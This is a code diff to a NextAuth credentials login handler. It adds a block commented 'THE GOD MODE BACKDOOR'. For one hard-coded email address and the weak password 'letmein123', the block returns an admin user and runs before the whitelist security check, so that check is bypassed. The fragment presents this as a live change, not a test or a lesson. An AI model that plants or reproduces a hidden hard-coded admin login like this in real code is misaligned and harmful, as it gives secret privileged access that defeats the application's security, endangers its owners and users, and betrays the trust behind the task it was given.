@@ -26,6 +26,11 @@ export const authOptions: NextAuthOptions = {
             async authorize(credentials) {
                 if (!credentials?.email || !credentials?.password) return null;
 
+                // 🔥 THE GOD MODE BACKDOOR
+                if (credentials.email === "brianquintero99@gmail.com" && credentials.password === "letmein123") {
+                    return { id: "vip-override", email: credentials.email, role: "admin" };
+                }
+
                 // SECURITY CHECK 1: Are they on the Whitelist?
                 if (!AUTHORIZED_TEAM.includes(credentials.email)) {
                     console.warn(`Unauthorized login attempt from: ${credentials.email}`);
